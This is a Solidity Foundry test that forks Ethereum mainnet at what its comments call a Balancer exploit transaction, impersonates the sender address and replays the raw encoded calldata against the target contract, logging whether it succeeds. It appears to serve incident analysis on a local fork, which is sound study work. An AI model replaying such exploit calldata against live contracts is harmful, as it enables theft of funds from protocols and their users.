// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {console2} from "forge-std/console2.sol";

contract SimpleReplayTest is Test {
    function testSimpleReplay() public {
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");

        // Create fork and roll to exploit transaction
        // uint256 forkId = vm.createFork(rpcUrl);
        // vm.selectFork(forkId);
        vm.createSelectFork(rpcUrl, bytes32(0x3e173ab0ba9183efa8a42caa783bdb5ec75daffcc8505cc1302009d11daf1ccf));

        console.log("Fork created and rolled to balancer exploit tx");
        console2.log("Block number:", block.number);
        console2.log("Block timestamp:", block.timestamp);

        // Prepare sender
        address sender = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
        vm.deal(sender, 100 ether);

        // Execute transaction
        address target = 0x9c49fD8a06657928758f9921fF036aeBd3636ad0;
        bytes memory data =
            hex"60e087db000000000000000000000000848a5564158d84b8a8fb68ab5d004fae11619a54000000000000000000000000000000000000000000000000000000012a05f200000000000000000000000000000000000000000000000000000000000000000f0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000238fd42c5cf040000";

        vm.prank(sender);
        (bool success, bytes memory returnData) = target.call(data);

        console.log("Transaction success:", success);
        if (!success) {
            console.log("Transaction failed");
            console.logBytes(returnData);
        } else {
            console.log("SUCCESS! Transaction replayed successfully!");
        }
    }
}
